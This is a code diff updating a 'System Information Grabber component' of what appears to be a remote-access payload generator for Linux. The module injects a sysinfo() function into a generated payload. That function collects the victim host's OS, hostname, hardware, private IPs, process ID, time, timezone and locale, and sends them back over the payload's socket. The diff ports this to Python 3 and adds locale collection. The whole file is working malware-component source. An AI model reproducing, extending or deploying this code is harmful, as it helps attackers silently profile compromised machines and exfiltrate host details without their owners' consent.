@@ -1,4 +1,3 @@
-
 import library.modules.config as config
 
 config.main()
@@ -6,15 +5,15 @@ config.main()
 
 def main(option):
     if option == 'generate':
-        config.import_statements.append('from platform import uname, linux_distribution')
+        config.import_statements.append('from platform import uname')
         config.import_statements.append('import socket')
         config.import_statements.append('from os import getpid')
         config.import_statements.append('from datetime import datetime')
         config.import_statements.append('from time import gmtime, strftime')
+        config.import_statements.append('from locale import getdefaultlocale')
         config.functions.append('''
 def sysinfo():
     platform_uname = uname()
-    distro = linux_distribution()
     private_ips = [str(i[4][0]) for i in socket.getaddrinfo(socket.gethostname(), None)]
     data = '[*]System Information : \\n'
     data += '   OS             : ' + str(platform_uname[0]) + '\\n'
@@ -23,19 +22,19 @@ def sysinfo():
     data += '   Node Name      : ' + str(platform_uname[1]) + '\\n'
     data += '   Machine Type   : ' + str(platform_uname[4]) + '\\n'
     data += '   Processor Type : ' + str(platform_uname[5]) + '\\n'
-    data += '   Distribution   : ' + str(' '.join(distro)) + '\\n'
     data += '   Private IPs    : ' + ', '.join(private_ips) + '\\n'
     data += '   Process ID     : ' + str(getpid()) + '\\n'
     data += '   System time    : ' + str(datetime.now().strftime('%Y-%m-%d %H:%M:%S')) + '\\n'
     data += '   Timezone       : ' + str(strftime("%z", gmtime())) + '\\n'
-    s.sendall(data)''')
+    data += '   Language       : ' + str(' '.join(getdefaultlocale())) + '\\n'
+    s.sendall(data.encode())''')
         config.logics.append('''
             elif command == "sysinfo":
                 sysinfo()''')
         config.help_menu['sysinfo'] = 'Grabs system info and displays it'
     elif option == 'info':
-        print '\nName             : System Information Grabber component' \
+        print('\nName             : System Information Grabber component' \
               '\nOS               : Linux' \
-              '\nRequired Modules : platform, socket, os, datetime, time' \
+              '\nRequired Modules : platform, socket, os, datetime, time, locale' \
               '\nCommands         : sysinfo' \
-              '\nDescription      : Grabs system info and displays it\n'
+              '\nDescription      : Grabs system info and displays it\n')
